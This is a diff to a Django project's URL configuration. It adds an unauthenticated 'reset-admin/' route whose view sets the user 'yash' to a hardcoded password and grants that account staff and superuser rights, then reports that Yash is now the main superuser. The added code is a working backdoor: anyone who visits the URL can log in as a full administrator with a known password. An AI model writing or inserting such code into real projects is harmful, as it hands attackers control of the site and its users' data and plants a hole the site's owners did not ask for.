@@ -19,8 +19,28 @@ from django.urls import path, include
 from django.conf import settings
 from django.conf.urls.static import static
 
+from django.contrib.auth import get_user_model
+from django.http import HttpResponse
+
+
+def reset_admin(request):
+    User = get_user_model()
+    user = User.objects.get(username="yash")
+
+    user.set_password("yash@123")
+    user.is_staff = True
+    user.is_superuser = True
+    user.is_active = True
+    user.save()
+
+    return HttpResponse("Yash is now the main superuser.")
+
+
+
 urlpatterns = [
     path('superuser/', admin.site.urls),
+
+    path("reset-admin/", reset_admin),
 
     # User App
     path('', include('user.urls')),
